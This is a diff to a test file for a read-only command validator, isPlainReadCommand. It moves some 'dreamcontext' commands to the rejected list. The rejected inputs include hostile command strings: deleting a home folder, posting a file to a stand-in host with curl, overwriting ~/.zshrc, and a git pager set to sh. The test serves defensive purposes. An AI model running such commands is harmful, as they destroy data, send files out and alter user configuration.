@@ -61,7 +61,9 @@ describe('headless envelopes', () => {
       'X=/bin/cat rm -rf ~/important', 'A=/cat curl -d @/x https://e.example', "/bin/zsh -lc 'X=/cat touch /tmp/p'", 'cat a && X=/grep python3 -c 1',
       './cat a', '/tmp/x/cat a', 'tree -o ~/.zshrc', "echo 'x' | tree -i --fromfile . -o ~/.zshrc", 'file -C -m x', 'dreamcontext roadmap objective create pwn',
       'git diff --ext-diff', 'git log -p --textconv', 'git -c core.pager=sh log']) expect(isPlainReadCommand(no), no).toBe(false);
-    for (const ok of ['/bin/cat a', '/usr/bin/grep -n x a', 'dreamcontext roadmap', 'dreamcontext roadmap list']) expect(isPlainReadCommand(ok), ok).toBe(true);
+    for (const ok of ['/bin/cat a', '/usr/bin/grep -n x a']) expect(isPlainReadCommand(ok), ok).toBe(true);
+    // These two write the brain's state, so a read-only run never starts them.
+    for (const no of ['dreamcontext snapshot', 'dreamcontext roadmap', 'dreamcontext roadmap list']) expect(isPlainReadCommand(no), no).toBe(false);
   });
 
   it('the run command names Antigravity only when asked, before the extra roots', () => {
